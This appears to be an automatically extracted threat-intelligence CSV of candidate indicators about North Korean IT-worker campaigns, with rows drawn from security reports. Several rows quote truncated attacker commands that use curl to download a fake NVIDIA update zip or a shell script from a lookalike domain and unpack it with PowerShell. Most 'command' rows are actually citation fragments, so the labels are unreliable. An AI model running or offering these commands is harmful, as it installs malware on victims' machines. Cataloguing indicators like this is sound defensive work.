schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--dprk-it-workers,artifact--sha256:c680936fb62d3b292c75f897ae51ef813f1555abdda3d6bde9b3d2cf135c4c6f,observation--sha256:93dee21c2b62d0785c309b1e393a461ebb5724f878518b97852331b17b89eea5,command,"[15] Madjar, T.; Miller, D.; Larson, S. From Clipboard to Compromise: A PowerShell Self-Pwn. Proofpoint. 17 June","15] Madjar, T.; Miller, D.; Larson, S. From Clipboard to Compromise: A PowerShell Self-Pwn. Proofpoint. 17 June",candidate,,unknown,unknown,not-stated,,source--dprk-it-workers--b57b6250dea995f1,CyberMerceNary/ITWorker/DeceptiveDevelopment-and-North-Korean-IT-workers-from-primitive-crypto-theft-to-sophisticated-AI-based-deception.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"DECEPTIVEDEVELOPMENT: FROM PRIMITIVE CRYPTO THEFT TO... HAVRÁNEK & KÁLNAI 17 VIRUS BULLETIN CONFERENCE SEPTEMBER 2025 REFERENCES [1] Havránek, M. DeceptiveDevelopment targets freelance developers. ESET. 20 February 2025. https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/. [2] Kálnai, P. Lazarus luring employees with trojanized coding challenges: The case of a Spanish aerospace company. ESET. 29 September 2023. https://www.welivesecurity.com/en/eset",
1.0.0,actor--dprk-it-workers,artifact--sha256:9930e0f7faad7b1dafb2accc10faf74b39e7911b85f060af179624cc12643209,observation--sha256:ac61d6ed44ce5136bce2d4858921000cc1b8e4e3643e3ea27a35fc1f99051ee4,command,2024. https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn.,2024. https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn,candidate,,unknown,unknown,not-stated,,source--dprk-it-workers--b57b6250dea995f1,CyberMerceNary/ITWorker/DeceptiveDevelopment-and-North-Korean-IT-workers-from-primitive-crypto-theft-to-sophisticated-AI-based-deception.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"DECEPTIVEDEVELOPMENT: FROM PRIMITIVE CRYPTO THEFT TO... HAVRÁNEK & KÁLNAI 17 VIRUS BULLETIN CONFERENCE SEPTEMBER 2025 REFERENCES [1] Havránek, M. DeceptiveDevelopment targets freelance developers. ESET. 20 February 2025. https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/. [2] Kálnai, P. Lazarus luring employees with trojanized coding challenges: The case of a Spanish aerospace company. ESET. 29 September 2023. https://www.welivesecurity.com/en/eset",
1.0.0,actor--dprk-it-workers,artifact--sha256:457cb32065529050d9bca466811ed0b8bf49a82a04bbba6b3d051301ac9642d7,observation--sha256:4e417554bc301bd43c1250a43e9f68eff0b104cc61398e9d4d5989bca1121b13,command,"Also, requests for malicious payloads must contain the string curl in the User-Agent field. Otherwise, the website","Also, requests for malicious payloads must contain the string curl in the User-Agent field. Otherwise, the website",candidate,,unknown,unknown,not-stated,,source--dprk-it-workers--b57b6250dea995f1,CyberMerceNary/ITWorker/DeceptiveDevelopment-and-North-Korean-IT-workers-from-primitive-crypto-theft-to-sophisticated-AI-based-deception.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"DECEPTIVEDEVELOPMENT: FROM PRIMITIVE CRYPTO THEFT TO... HAVRÁNEK & KÁLNAI 11 VIRUS BULLETIN CONFERENCE SEPTEMBER 2025 In May 2025 we also observed a variant of WeaselStore written in Python, also known as PylangGhost [21], but with identical functionality and structure, including some unused behaviour and code patterns that suggest this to be a direct rewrite from the original Go language into Python. Network infrastructure – staging server API The WeaselStore staging servers we observed provide",
1.0.0,actor--dprk-it-workers,artifact--sha256:c4790d1f4021a0f5856a72b5acc48ae4c9fbd92bfd2dda67bde52d6e9d5553b8,observation--sha256:3a891c70de4c0d2c9ded25f27a38c9563576e0c01ca21f32f86902cff77ea060,command,"<campaign_ID>.update && powershell -Command ""Expand-Archive -Force -Path '%TEMP%\","campaign_ID>.update && powershell -Command ""Expand-Archive -Force -Path '%TEMP%\",candidate,,unknown,unknown,not-stated,,source--dprk-it-workers--b57b6250dea995f1,CyberMerceNary/ITWorker/DeceptiveDevelopment-and-North-Korean-IT-workers-from-primitive-crypto-theft-to-sophisticated-AI-based-deception.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"DECEPTIVEDEVELOPMENT: FROM PRIMITIVE CRYPTO THEFT TO... HAVRÁNEK & KÁLNAI 8 VIRUS BULLETIN CONFERENCE SEPTEMBER 2025 Initial compromise Following our initial discovery of WeaselStore being distributed through InvisibleFerret, the attackers opted for various other methods to compromise users, relying on clever social engineering tricks. Fake recruiter accounts are used, similar to previous DeceptiveDevelopment activity, but this time with the addition of a new social engineering technique known a",
1.0.0,actor--dprk-it-workers,artifact--sha256:2947dfcf504ec6193377c0fae73095feca1d8f5e28ba03e1439545f16b5111d4,observation--sha256:3bc68ee6bcf1217263d7badd74a9d781e2b016eac99cf8d6e22013bb36ee418a,command,"line interface and PowerShell, putting “123456” as its connection PIN. Meanwhile,","line interface and PowerShell, putting “123456” as its connection PIN. Meanwhile",candidate,2025-12-25T00:00:00Z,day,known,same-record,,source--dprk-it-workers--15da1b5bbfbc5250,"CyberMerceNary/ITWorker/Smile, You’re on Camera_ A Live Stream from Inside Lazarus Group’s IT Workers Scheme.pdf","{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"OTP.ee extension (or Authenticator.cc, an OTP generator) and last but not least, Google Remote Desktop. Simplify Copilot extension installed Next, he opened Google Remote Desktop. With his account already displaying two other hosts, “AARON-PC” and “Blaze“, he started setting up this laptop via command line interface and PowerShell, putting “123456” as its connection PIN. Meanwhile, he checked his email account. Without any doubt, we understood it was the proper time for an unexpected crash. He w",
1.0.0,actor--dprk-it-workers,artifact--sha256:9d31e619957477b5b6baeeb58e6ff6b8e895c48cde0ac534810fade902dfc0f4,observation--sha256:94d8e882ca88599231f66e52f5e6c8959b9a103978bddf09a2a82d280ace16fb,command,"• On Windows: curl -k -o ""%TEMP%\nvidiaupdate.zip"" https://api.nvidia-release[.]org/nvidia-","• On Windows: curl -k -o ""%TEMP%\nvidiaupdate.zip"" https://api.nvidia-release.org/nvidia-",candidate,,unknown,unknown,not-stated,,source--dprk-it-workers--b57b6250dea995f1,CyberMerceNary/ITWorker/DeceptiveDevelopment-and-North-Korean-IT-workers-from-primitive-crypto-theft-to-sophisticated-AI-based-deception.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"DECEPTIVEDEVELOPMENT: FROM PRIMITIVE CRYPTO THEFT TO... HAVRÁNEK & KÁLNAI 8 VIRUS BULLETIN CONFERENCE SEPTEMBER 2025 Initial compromise Following our initial discovery of WeaselStore being distributed through InvisibleFerret, the attackers opted for various other methods to compromise users, relying on clever social engineering tricks. Fake recruiter accounts are used, similar to previous DeceptiveDevelopment activity, but this time with the addition of a new social engineering technique known a",
1.0.0,actor--dprk-it-workers,artifact--sha256:8f969d6e576a9046340df2e16da08059c8101cbf7fc6e272cad4a6b96eb2b2b2,observation--sha256:3013a62cd80226809801c00df452b83f2284a66eb17050035b49b70d35d7e83f,command,• On macOS (and presumably also Linux): curl -k -o /var/tmp/ffmpeg.sh https://api.nvidia-,• On macOS (and presumably also Linux): curl -k -o /var/tmp/ffmpeg.sh https://api.nvidia-,candidate,,unknown,unknown,not-stated,,source--dprk-it-workers--b57b6250dea995f1,CyberMerceNary/ITWorker/DeceptiveDevelopment-and-North-Korean-IT-workers-from-primitive-crypto-theft-to-sophisticated-AI-based-deception.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"DECEPTIVEDEVELOPMENT: FROM PRIMITIVE CRYPTO THEFT TO... HAVRÁNEK & KÁLNAI 8 VIRUS BULLETIN CONFERENCE SEPTEMBER 2025 Initial compromise Following our initial discovery of WeaselStore being distributed through InvisibleFerret, the attackers opted for various other methods to compromise users, relying on clever social engineering tricks. Fake recruiter accounts are used, similar to previous DeceptiveDevelopment activity, but this time with the addition of a new social engineering technique known a",
1.0.0,actor--dprk-it-workers,artifact--sha256:a2a11f617a483f176246ea19a0c15f6f298b896ca964d1311d9e20af770fb672,observation--sha256:77554b37c265276af8cc8fd7c001b2a44e67634c2e5ad5d105a09d3e3db14d4b,file-name,151216_Cha_NorthKoreasCyberOperations_Web.pdf,151216_Cha_NorthKoreasCyberOperations_Web.pdf,candidate,2025-03-01T00:00:00Z,month,known,same-record,,source--dprk-it-workers--94775915798a421c,CyberMerceNary/ITWorker/DTEX-Exposing+DPRK+Cyber+Syndicate+and+Hidden+IT+Workforce.pdf,"{""page"": 51}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"EXPOSING DPRK’S CYBER SYNDICATE AND HIDDEN IT WORKFORCE 51 Hayato Sasaki, “Tempted to Classify APT Actors: Practical Challenges of Attribution in the Case of Lazarus’s Subgroup,” JPCERT/CC Eyes, March 25, 2025, https://blogs.jpcert.or.jp/en/2025/03/classifying-lazaruss-subgroup. html Dan Goodin, “Gemini Hackers Can Deliver More Potent Attacks with a Helping Hand from Gemini,” Ars Technica, March 2025, https://arstechnica.com/security/2025/03/gemini-hackers-can-deliver-more-potent-attacks-with-a-",
1.0.0,actor--dprk-it-workers,artifact--sha256:d6c4853dbc2e64a759292acc931b7fca98b58675726b3e362e212d84d7893b05,observation--sha256:5257909447338338cd404dcc176ecdf89880726549f169e1be63578dd31d2067,file-name,2BWorkforce.pdf,2BWorkforce.pdf,candidate,,unknown,unknown,not-stated,,source--dprk-it-workers--769f09c40948bde0,CyberMerceNary/ITWorker/readme.md,"{""line"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,Exposing DPRK's Cyber Syndicate and Hidden IT Workforce - https://reports.dtexsystems.com/DTEX-Exposing%2BDPRK%2BCyber%2BSyndicate%2Band%2BHidden%2BIT%2BWorkforce.pdf,
1.0.0,actor--dprk-it-workers,artifact--sha256:beaec3099d35bb46df20e89f1c83c9ac39c5bd1f082bcbf263f7ceb8b224f653,observation--sha256:14e39ea1d564094be0b7d938d941bd2392569ea42ae99399bbb54d38b968a7b5,file-name,(3).pdf,3).pdf,candidate,2020-11-13T00:00:00Z,day,known,same-record,,source--dprk-it-workers--94775915798a421c,CyberMerceNary/ITWorker/DTEX-Exposing+DPRK+Cyber+Syndicate+and+Hidden+IT+Workforce.pdf,"{""page"": 53}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"EXPOSING DPRK’S CYBER SYNDICATE AND HIDDEN IT WORKFORCE 53 Josh Smith and Jack Stubbs, “Exclusive: North Korea-Linked Hackers Targeted AstraZeneca in COVID-19 Spying Campaign – Sources,” Reuters, November 27, 2020, https://www.reuters.com/article/us-healthcare-coronavirus- astrazeneca-no-idUSKBN2871A2/ Tom Burt, “Cyberattacks Targeting Health Care Must Stop,” Microsoft On the Issues, November 13, 2020, https:// blogs.microsoft.com/on-the-issues/2020/11/13/health-care-cyberattacks-covid-19-paris-",
